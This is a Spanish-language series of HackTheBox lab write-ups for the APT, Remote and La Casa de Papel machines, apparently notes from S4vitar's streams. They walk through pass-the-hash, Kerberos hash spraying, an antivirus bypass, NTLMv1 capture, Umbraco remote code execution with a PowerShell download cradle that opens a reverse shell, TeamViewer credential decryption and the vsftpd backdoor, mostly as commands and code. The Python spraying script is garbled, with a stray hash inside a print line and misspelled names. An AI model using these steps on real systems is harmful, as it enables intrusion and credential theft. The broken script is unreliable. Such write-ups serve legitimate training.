#### CrackMapExec {-}

Aqui vamos a por **crackMapExec**. La version que utiliza S4vitaar es la *5.1.1 dev* que no permite usar IPV6 y tiene que subir a la version *5.1.7 dev*

```bash
pushd /opt
curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python -
apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
poetry install
poetry run crackMapExec smb dead:beef::b885:d62a:d679:573f
```

Vemos que la maquina se llama apt y que el dominio es htb.local. Añadimos los dos en el `/etc/hosts`

```bash
dead:beef::b885:d62a:d679:573f  apt htb.local
```

#### CrackMapExec via alternativa {-}

Una via alternativa seria redirigir el flujo de nuestro puerto 445 local hacia el puerto 445 de la maquina victima con **socat**.

1. redirigimos el puerto 445

    ```bash
    socat TCP-LISTEN:445,fork TCP:apt:445
    ```

1. uzamos la version mas antigua de crackmap exec a nuestra maquina local

    ```bash
    crackmapexec smb localhost
    ```

#### SmbClient {-}

Miramos los recursos compartidos a nivel de red con **smbclient**

```bash
smbclient -L dead:beef::b885:d62a:d679:573f -N
```

Vemos un directorio backup. Miramos si nos podemos connectar.

```bash
smbclient //dead:beef::b885:d62a:d679:573f/backup -N
dir
get backup.zip
```

Aqui hay un backup.zip y lo descargamos a nuestro equipo de atacante. Si intentamos unzipear el archivo vemos que esta protegido por contraseña.

### Crackeando la contraseña con fcrackzip {-}

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt backup.zip
```

Aqui podemos ver la contraseña.

```bash
unzip backup.zip
```

Aqui podemos ver que tenemos un **ntds.dit** y un **SYSTEM**. Esto quiere decir que podemos jugar con **SecretsDump**

### SecretsDump {-}

Teniendo un ntds.dit y un SYSTEM, podemos pillar los hashes NTLMv2 de los usuarios del Directorio Activo. Como lo hacemos desde nuestra
maquina local, tenemos que ponerle un **LOCAL** al final.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
```

Aqui recuperamos un monton de informacion. Vamos a tratar de recojer unicamente la informacion que nos interesa. Vemos que todo los usuarios tienen un 
hash **aad3b435b51404eeaad3b435b51404ee**.

```bash
impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL | grep "aad3b435b51404eeaad3b435b51404ee" > data
```

Intentamos un pass the hash con el usuario Administrator

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'Administrator' -H '2b576acbe6bcfda7294d6bd18041b8fe'
```

Vemos que no podemos hacer pass the hash a todos los usuarios, Tenemos que recuperar un listado de usuarios validos.

1. Creamos un fichero de usuarios

    ```bash
    cat data | awk '{print $1}' FS=":" | wc -l
    cat data | awk '{print $1}' FS=":" | sort -u | wc -l
    cat data | awk '{print $1}' FS=":" > users
    ```

1. creamos un fichero de hashes NT

    ```bash
    cat data | awk '{print $4}' FS=":" > hash
    ```

Aqui vamos a intentar bruteforcear los usuarios con kerbrute.

### Kerbrute {-}

Aqui vamos a tirar del **kerbrute** para tratar de brueforcear el Kerberos para conocer los usuarios validos

```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build -ldflags "-s -w" .
upx kerbrute
```

Ya podemos enumerar los usuarios 

```bash
./kerbrute userenum --dc apt -d htb.local ../users
```

Aqui vemos que hay un usuario **henry.vinson@htb.local** que es valido.

Si intentamos un pass the hash con este usuario

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H '2de80758521541d19cabbba480b260e8f'
```

Vemos que el hash no es valido. Aqui intentamos ver si el hash de este usuario esta en la lista de los hashes pero como kerbrute o otra heramientas
como pyKerbrute no nos permiten hacer un bruteforce de hashes, nos creamos nuestro proprio script en python

> [ ! ] NOTAS: podriamos intentar bruteforcear hashes con smb con el comando `poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H /home/s4vitar/Desktop/APT/content/hash` pero 
se bloquea a partir de unos cuantos hash (seguridad de smb). 

### Script de bruteforce de hashes {-}

Aqui en vez de crear nuestro script desde zero, uzamos el script en python de [pyKerbrute](https://github.com/3gstudent/pyKerbrute) y la modificamos
El script que nos interessa es el ADPwdSpray.py.

```python
#!/usr/bin/python
import sys, os
import socket, signal
from pwn import *
from random import getrandbits
from time import time, localtime, strftime
from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormatSimple
from pyasn1.codec.der.encoder import encode
from struct import pack, upack
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from _crypto import ARC4, MD5, MD4
from time import time, gmtime, strftime, strptime, localtime
import hmac as HMAC
from random import getrandbits, sample

RC4_HMAC = 23
NT_PRINCIPAL = 1
NT_SRV_INST = 2

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")aad3b435b51404eeaad3b435b51404ee
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

def random_bytes(n):
    return ''.join(chr(c) for c in sample(xrange(256), n))

def encrypt(etype, key, msg_type, data):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    data = random_bytes(8) + data
    chksum = HMAC.new(k1, data).digest()
    k3 = HMAC.new(k1, chksum).digest()
    return chksum + ARC4.new(k3).encrypt(data)

def epoch2gt(epoch=None, microseconds=False):
    if epoch is None:
        epoch = time()
    gt = strftime('%Y%m%d%H%M%SZ', gmtime(epoch))
    if microseconds:
        ms = int(epoch * 1000000) % 1000000
        return (gt, ms)
    return gt



def ntlm_hash(pwd):
    return MD4.new(pwd.encode('utf-16le'))

def _c(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))

def _v(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)


def application(n):
    return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)

class Microseconds(Integer): pass

class KerberosString(GeneralString): pass

class Realm(KerberosString): pass

class PrincipalName(Sequence):
    componentType = NamedTypes(
        NamedType('name-type', _c(0, Integer())),
        NamedType('name-string', _c(1, SequenceOf(componentType=KerberosString()))))

class KerberosTime(GeneralizedTime): pass

class HostAddress(Sequence):
    componentType = NamedTypes(
        NamedType('addr-type', _c(0, Integer())),
        NamedType('address', _c(1, OctetString())))

class HostAddresses(SequenceOf):
    componentType = HostAddress()


class PAData(Sequence):
    componentType = NamedTypes(
        NamedType('padata-type', _c(1, Integer())),
        NamedType('padata-value', _c(2, OctetString())))

    
class KerberosFlags(BitString): pass

class EncryptedData(Sequence):
    componentType = NamedTypes(
        NamedType('etype', _c(0, Integer())),
        OptionalNamedType('kvno', _c(1, Integer())),
        NamedType('cipher', _c(2, OctetString())))
    
class PaEncTimestamp(EncryptedData): pass


class Ticket(Sequence):
    tagSet = application(1)
    componentType = NamedTypes(
        NamedType('tkt-vno', _c(0, Integer())),
        NamedType('realm', _c(1, Realm())),
        NamedType('sname', _c(2, PrincipalName())),
        NamedType('enc-part', _c(3, EncryptedData())))
    
class KDCOptions(KerberosFlags): pass

class KdcReqBody(Sequence):
    componentType = NamedTypes(
        NamedType('kdc-options', _c(0, KDCOptions())),
        OptionalNamedType('cname', _c(1, PrincipalName())),
        NamedType('realm', _c(2, Realm())),
        OptionalNamedType('sname', _c(3, PrincipalName())),
        OptionalNamedType('from', _c(4, KerberosTime())),
        NamedType('till', _c(5, KerberosTime())),
        OptionalNamedType('rtime', _c(6, KerberosTime())),
        NamedType('nonce', _c(7, Integer())),
        NamedType('etype', _c(8, SequenceOf(componentType=Integer()))))

class KdcReq(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(1, Integer())),
        NamedType('msg-type', _c(2, Integer())),
        NamedType('padata', _c(3, SequenceOf(componentType=PAData()))),
        NamedType('req-body', _c(4, KdcReqBody())))

class PaEncTsEnc(Sequence):
    componentType = NamedTypes(
        NamedType('patimestamp', _c(0, KerberosTime())),
        NamedType('pausec', _c(1, Microseconds())))


class AsReq(KdcReq):
    tagSet = application(10)

def build_req_body(realm, service, host, nonce, cname=None):
 
    req_body = KdcReqBody()

    # (Forwardable, Proxiable, Renewable, Canonicalize)
#   req_body['kdc-options'] = "'01010000100000000000000000000000'B"
    req_body['kdc-options'] = "'00000000000000000000000000010000'B"
    if cname is not None:
        req_body['cname'] = None
        req_body['cname']
        req_body['cname']['name-type'] = NT_PRINCIPAL
        req_body['cname']['name-string'] = None
        req_body['cname']['name-string'][0] = cname

    req_body['realm'] = realm

    req_body['sname'] = None
    req_body['sname']['name-type'] = NT_SRV_INST
    req_body['sname']['name-string'] = None
    req_body['sname']['name-string'][0] = service
    req_body['sname']['name-string'][1] = host

    req_body['till'] = '19700101000000Z'
    
    req_body['nonce'] = nonce

    req_body['etype'] = None
    req_body['etype'][0] = RC4_HMAC
    
    return req_body

def build_pa_enc_timestamp(current_time, key):
    gt, ms = epoch2gt(current_time, microseconds=True)
    pa_ts_enc = PaEncTsEnc()
    pa_ts_enc['patimestamp'] = gt
    pa_ts_enc['pausec'] = ms

    pa_ts = PaEncTimestamp()
    pa_ts['etype'] = key[0]
    pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))

    return pa_ts


def build_as_req(target_realm, user_name, key, current_time, nonce):

    req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
    pa_ts = build_pa_enc_timestamp(current_time, key)
    
    as_req = AsReq()

    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    as_req['padata'] = None
    as_req['padata'][0] = None
    as_req['padata'][0]['padata-type'] = 2
    as_req['padata'][0]['padata-value'] = encode(pa_ts)


    as_req['req-body'] = _v(4, req_body)

    return as_req

def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            if datalen is None:
                datalen = unpack('>I', rep[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            sock.close()
            return data

def _decrypt_rep(data, key, spec, enc_spec, msg_type):
    rep = decode(data, asn1Spec=spec)[0]
    rep_enc = str(rep['enc-part']['cipher'])
    rep_enc = decrypt(key[0], key[1], msg_type, rep_enc)
    rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
    
    return rep, rep_enc
    

def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):
    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
    sock = send_req_tcp(as_req, kdc_a)
    data = recv_rep_tcp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==18):
            if(ord(c)==0x0b):
                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))

if __name__ == '__main__':
    user_realm = 'htb.local'
    username = 'henry.vinson'
    kdc_a = 'apt'

    f = open("hash", "r")
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    number = 1
    for ntlm in f.readlines():
        ntlm = ntlm.strip('\n')
        p1.status("Probando con el Hash [%s/2000]: %s" % (str(number), ntlm)
        user_key = (RC4_HMAC, ntml.decode('hex'))
        passwordspray_tcp(user_realm, username, user_key, kdc_a, ntlm)

```

Hemos cambiado el **socket.AF_INET** en **socket.AF_INET6** y el main para que podamos leer el fichero de hashes.

Lanzando el script, encontramos un hash valido. Lo verificamos

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb'
```

> [ ! ] NOTAS: Podriamos hacer ASProasting o Kerberoasting attack pero S4vi nos adelanta que no funcciona y que ademas es complicado con IPV6


### Dumpeo de registros desde la maquina local {-}

Los registros se pueden dumpear desde la maquina local. Es interessante siempre probar esto porque se puede encontrar informaciones de esta manera.
Los registros son:

- HKCR
- HKCU
- HKLM
- HKU
- HKCC
- HKPD

Utilizamos la heramienta **reg.py** de impacket para lograr esto.

```bash
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKCR
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKCU
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKLM
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU
```


Aqui vemos informaciones interesantes, y miramos por lo que nos parece interesante

```bash
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software
impacket-reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem
```

Aqui encontramos usuario y contraseña para henry.vinson_adm. Verificamos las credenciales

```bash
pushd /opt/CrackMapExec
poetry run crackmapexec smb dead:beef::b885:d62a:d679:573f -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
```

Es valida y intentamos connectarnos con Evil-WinRM

<!--chapter:end:57-Apt/57-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### WinRM {-}

```bash
gem install evil-winrm
evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
```

Nos conectamos y podemos leer la flag.



<!--chapter:end:57-Apt/57-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

Aqui vamos a tirar de **WinPeas**. Descargamos el winPEAS en nuestro equipo de atacante

```bash
wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
```

Il lo cargamos desde Evil-WinRM

```powershell
cd C:\Users\henry.vinson_adm\AppData\Local\Temp
upload winPEASx64.exe
dir
.\winPEASx64.exe
```

Aqui vemos que no podemos lanzar el exe porque no lo pilla el antivirus. En este caso el defender no nos deja passar por los bypass normales
pero podemos hacer cositas con funcciones de Evil-WinRM.

```powershell
menu
Bypass-4MSI
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/winPEASx64.exe
```

Tenemos que esperar que se acabe la ejecucion para ver el resultado.

Aqui no vemos nada interessante. Probamos otre binario de analysis, el [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/).

```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
```

Lo cargamos nuevamente a la maquina victima

```powershell
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe
Invoke-Binary /home/s4vitar/Desktop/HTB/APT/content/Seatbelt.exe -group=all
```

Aqui podemos ver que el NTLM de version 1 esta expuesta en esta maquina.

Aqui vamos a tirar de [crack.sh](https://crack.sh/cracking-ntlmv1-w-ess-ssp/) en lo cual podemos tratar de utilizar el **responder** para
recuperar la llaves y crackearlas con [crack.sh](https://crack.sh)

1. Modificamos el fichero de configuracion de responder

    ```bash
    cd /usr/share/responder
    vi Responder.conf

    # cambiamos el challenge 
    Challenge = 1122334455667788
    ```

1. lanzamos el responder

    ```bash
    python3 responder.py -I tun0 --lm
    ```

1. desde la maquina victima aprovechamos del defender para scanear ficheros

    ```bash
    cd C:\Program Files\Windows Defender
    .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.8\algoquenoexiste
    ```

Aqui vemos que hemos pillado el hash NTLMv1 de la propria maquina. Lo copiamos y usamos de ntlmv1-multi para crear el hash necessario para
romper con crack.sh

```bash
git clone https://github.com/evilmog/ntlmv1-multi
cd ntlmv1-multi
python3 ntlmv1.py --ntlmv1 'APT$::HTB:95ACA8C72487742B427E1AE5B8D5CE6830A49B5BBB58D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788'
```

Aqui podemos copiar el hash en [crack.sh](https://crack.sh) usando un temporary email y recivimos un mail con la key.

```bash
impacket-secretsdump -hashes :d167c32388864b12f5f82feae86a7f798 'htb.local/APT$@apt'
```

Aqui ya vemos los hash de los usuarios y con evil-winRM no connectamos con el usuario administrator

```bash
evil-winrm -i apt -u 'Administrator' -H 'c370bddf384a691d811ff3495e8a72e2'
```

y visualizar la flag.

<!--chapter:end:57-Apt/57-04-PrivilegeEscalation.Rmd-->

# Remote {-}

## Introduccion {-}

La maquina del dia se llama Remote.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/81Sfzyyi560/0.jpg)](https://www.youtube.com/watch?v=81Sfzyyi560)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:58-Remote/58-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.180
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.180
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.180 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,80,111,135,445,2049,49666 10.10.10.180 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta? |
| ------ | -------- | --------------------------- | ---------- |
| 21     | ftp      | anonymous                   |            |
| 80     | http     | Web Fuzzing                 |            |
| 111    | rpcbind  |                             |            |
| 135    | msrpc    |                             |            |
| 445    | smb      | Conneccion con null session |            |
| 2049   | mountd   | nfs, showmount              |            |
| 49666  | msrpc    | Puertos windows por defecto |            |


### Coneccion Anonoymous con ftp {-}

```bash
ftp 10.10.10.180

Name: anonymous
Password: 

User logged in.

dir

put allPorts
```

Nos podemos conectar pero no hay nada y no podemos subir nada.

### Listeo con showmount {-}

```bash
showmount -e 10.10.10.180
```

Aqui vemos un `/site_backups`, lo montamos

```bash
mkdir /mnt/nfs
mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.180
```

No vemos nada interesante aqui.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.180`, El wappalizer no nos muestra nada.
Hay una serie de "posts" que habla de umbraco. Con google miramos lo que es umbraco y vemos que es un CMS.
Miramos si existe un exploit para umbraco.

```bash
searchsploit umbraco
```

Vemos que hay un exploit en python pero tenemos que estar loggeado.

Miramos por internet si hay un default path para el panel de administracion y vemos la routa `http://mysite/umbraco`. Si vamos a este directorio
vemos el panel de autheticacion. Ahora tenemos que buscar el usuario y la contraseña.


<!--chapter:end:58-Remote/58-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Analyzando el mount {-}

```bash
cd /mnt/nfs
ls
cd App_Browsers
cd ..
cd App_Data
ls
```

Aqui vemos un fichero umbraco.config y un Umbraco.sdf. Miramos lo que contienen

```bash
cat umbraco.config
cat Umbraco.sdf
strings Umbraco.sdf | less -S
```

Aqui vemos usuarios con hashes.

### Crack hash con john {-}

Copiamos el hash en un fichero y lo crackeamos con john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Ya tenemos una contraseña. Nos connectamos en el panel de authenticacion.

```bash
user: admin@htb.local 
pwd : baconandcheese
```

### Abusando de Umbraco {-}

Ahora que hemos ganado acceso al dashboard de Umbraco, tenemos que encontrar la via para ganar acceso al systema. Como ya hemos encontrado 
exploits en la **exploit-db**, vamos a utilizar una de ellas.

```bash
searchsploit umbraco
searchsploit -m 46153.py
mv 46153.py umbraco_exploit.py
vi umbraco_exploit.py
```

Aqui le ponemos los datos necessario

```python
login = "admin@htb.local"
password = "baconandcheese"
host = "http://10.10.10.180"

#en el payload
proc.StartInfo.FileName = "cmd.exe"
cmd = "/c ping 10.10.14.8"
```

Nos ponemos en escucha por trazas icmp

```bash
tcpdump -i tun0 icmp -n
```

y lanzamos el exploit con `python umbraco_exploit.py` y vemos que tenemos capacidad de ejecucion de comandos.



<!--chapter:end:58-Remote/58-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Umbraco {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Recuperamos conPtyShell

    ```bash
    git clone https://github.com/antonioCoco/ConPtyShell
    cd ConPtyShell
    cp invoke-ConPtyShell.ps1 ../conptyshell.ps1
    cd ..
    vi conptyshell.ps1
    ```

1. Añadimos al final del fichero el commando

    ```powershell
    Invoke-ConPtyShell -RemoteIp 10.10.14.8 -RemotePort 443 -Rows 52 -Cols 189
    ```

1. Creamos un servidor http con python

    ```bash
    python -m http.server 80
    ```

1. Modificamos el commando a lanzar en el umbraco_exploit.py

    ```python
    proc.StartInfo.FileName = "cmd.exe"
    cmd = "/c powershell IEX(New-Object Net.WebClient).downloadString(\'http://10.10.14.8/conptyshell.ps1\')"
    ```

1. Lanzamos el script

    ```bash
    python3 umbraco_exploit.py
    ```

Aqui vemos que hemos ganado acceso al systema como el usuario **defaultappool** con una shell totalmente interactiva.

### Tratamiento de la TTY {-}

```bash
^Z
stty raw -echo; fg
Enter
whoami
whoami
cd C:\
cd C:\
```

Aqui ya podemos ver la flag en el directorio Public.

<!--chapter:end:58-Remote/58-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
whoami
systeminfo
whoami /priv
```

Aqui vemos que tenemos privilegios SeImpersonatePrivilege. Podriamos tratar de utilizar el JuicyPotato pero en este caso vamos a hacerlo de otra forma.
Si hacemos 

```powershell
tasklist
```

Vemos que hay un **TeamViewer_Service.exe**. 

```bash
locate teamviewer | grep "metasploit"
cat /usr/share/metasploit-framework/modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

Como no vamos a utilizar metasploit nos creamos un script en python, pero primero miramos el script y recuperamos la version y la contraseña cifrada.

```powershell
cd C:\
cd PROGR~1
dir
cd PROGR~2
dir
cd TeamViewer
dir
#Output Version7

cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7
Get-itemproperty -Path .
(Get-itemproperty -Path .).SecurityPasswordAES
```

Aqui ya tenemos el cifrado de la contraseña. La copiamos y la modificamos para poder usarla desde el script de python

```bash
echo "255
155
28
115
214
107
206
49
172
65
62
174
19
27
78
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91" | xargs | sed 's/ /, /g' | tr -d '\n' | xclip -sel clip
```

y creamos nuestro script

```python
#!/usr/bin/python3
from Crypto.Cipher = AES

key = b'\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00'
IV = b'\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xf2\x5e\xa8\xd7\x04'

decipher = AES.new(key, AES.MODE_CBC, IV)
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 78, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

plaintext = decipher.decrypt(ciphertext).decode()
print(plaintext)
```

Lanzamos el script y tenemos la contraseña del teamviewer.

contraseña encontrada es contraseña que tenemos que verificar.

```bash
crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
```

Nos da un **(Pwn3d!)**.

Nos connectamos con psexec

```bash
psexec.py WORKGROUP/Administrator@10.10.10.180 cmd.exe
password: !R3m0te!

whoami nt authority\system
```

Ya somos administrador y podemos ver la flag.

<!--chapter:end:58-Remote/58-04-PrivilegeEscalation.Rmd-->

# La Casa de Papel {-}

## Introduccion {-}

La maquina del dia se llama LaCasaDePapel.

El replay del live se puede ver aqui

[![S4vitaar Sauna maquina](https://img.youtube.com/vi/Pd-njw4ksnA/0.jpg)](https://www.youtube.com/watch?v=Pd-njw4ksnA)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:59-LaCasaDePapel/59-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.131
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.131
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.131 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,80,443 10.10.10.131 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta? |
| ------ | -------- | --------------------------- | ---------- |
| 21     | ftp      | anonymous                   |            |
| 22     | ssh      | Coneccion directa           |            |
| 80     | http     | Web Fuzzing                 |            |
| 443    | https    | Web Fuzzing                 |            |


Ya aqui podemos ver en el commonName del certificado ssl `lacasadepapel.htb` que añadimos al `/etc/hosts`

### Coneccion Anonoymous con ftp {-}

```bash
ftp 10.10.10.131

Name: anonymous
Password: 

530 Login incorrect.
```

No nos podemos conectar con el usuario anonymous, Pero podemos ver que el servicio es un vsFTPd 2.3.4 que ya sabemos que existe un exploit

```bash
searchsploit vsftpd 2.3.4

#Output
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
```

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.131
```

No vemos nada interesante aqui.

#### Checkear la web {-}

Si entramos en la url `http://10.10.10.131`, El wappalizer no nos muestra nada. Si entramos con el dominio `http://lacasadepapel.htb` vemos lo mismo.
Intentamos por **https** `https://lacasadepapel.htb` y aqui la cosa cambia. Tenemos un mensaje que dice que tenemos que proporcionar un certificado cliente
para ver mas cosas. Pero aqui necessitamos tener mas informaciones.

<!--chapter:end:59-LaCasaDePapel/59-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Como ya sabemos que esta version es vulnerable, buscando por internet o analyzando el exploit de Metasploit vemos que la vulnerabilidad
reside en poner una sonrisita `:)` al final del nombre de usuario y esto hace que se habre el puerto 6200 de la maquina.

```bash
nc 10.10.10.131 6200

#Output
Ncat: Connection refused.

telnet 10.10.10.131 21
USER s4vitar:)
PASS setenso
```

se queda bloqueado, podemos cerrar la ventana y con nc intentamos nuevamente la coneccion al puerto 6200.

```bash
nc 10.10.10.131 6200
```

Intentamos enviar commandos

```bash
whoami
#Error PHP Warning: Use of undefined constant whoami - assumed 'whoami' (this will throw an Error in a future version of PHP)
```

Intentamos commandos **PHP**

```bash
exec("whoami")
#error
shell_exec("whoami")
#error
passthru("whoami")
#error
system("whoami")
#error
help
#Output
help
ls
dump
doc
show
wtf
...
```

Vemos cosas intentamos con **ls** ver las variables classes funcciones y mas

```bash
ls
#Output
$tokyo
```

Miramos el contenido con show

```bash
show $tokyo
#output
class Tokyo {
    private function sign($caCert, $userCsr){
        ...
    }
}
```

Aqui vemos la class Tokyo con su funccion private. Podemos ver que en el directorio `/home/nairobi/ca.key` hay una key. Como este servicio
esta en php, miramos si podemos listar contenido de ficheros con las fucciones php `file_get_contents()`, `scandir()` o `readfile()`

```bash
file_get_contents("/etc/passwd")
```

Y podemos ver el `/etc/passwd`, miramos si podemos ver la key del usuario nairobi.

miramos si encontramos id_rsa

```bash
scandir("/")
scandir("/home")
scandir("/home/berlin/.ssh")
scandir("/home/nairobi/.ssh")
scandir("/home/oslo/.ssh")
scandir("/home/dali/.ssh")
scandir("/home/professor/.ssh")
```

No encontramos nada. Miramos el contenido del fichero key.

```bash
readfile("/home/nairobi/ca.key")
```

Ahora que tenemos la key podemos crear un certificado de cliente valido.

### Creamos un certificado de cliente valido {-}

1. Tenemos que recuperar el certificado del servidor

   ```bash
    openssl s_client -connect 10.10.10.131:443
    openssl s_client -connect 10.10.10.131:443 | openssl x509
    openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer
    ```

1. Copiamos el contenido del ca.key en un fichero ca.key

    - Aqui tenemos 2 ficheros el ca.key y el ca.cer

1. Con openssl creamos un private key

    ```bash
    openssl genrsa -out client.key 4096
    ```

1. Creamos un .req

    ```bash
    openssl req -new -key client.key -out client.req
    ```

    en commonName ponemos lacasadepapel.htb en el resto le damos al enter.

1. Firmamos el certificado

    ```bash
    openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer
    ```

    Aqui ya tenemos un certificado cliente valido. Pero ahora tenemos que convertirlo en un `.p12` para que los navegadores los accepten.

1. Conversion en certificado pkcs12 para navegadores

    ```bash
    openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
    chmod 777 client.p12
    ```


Aqui ya podemos añadir a firefox el certificado firmado. En firefox vamos a `ajustes` y buscamos por `cert`. Damos a `Ver certificado` y en el menu `Sus certificados`
le podemos dar a `importar`. Importamos el `client.p12` y le damos a acceptar. 

Si recargamos la pagina `https://lacasadepapel.htb` y acceptamos el certificado, ya podemos ver que el contenido a cambiado y un private arena es visible.

### Pathtraversal con base64 {-}

Aqui vemos dos Seasons y si le damos a una vemos unos ficheros `.avi` y haciendo hovering bemos que los nombres son en base64. Lo comprobamos con un fichero.

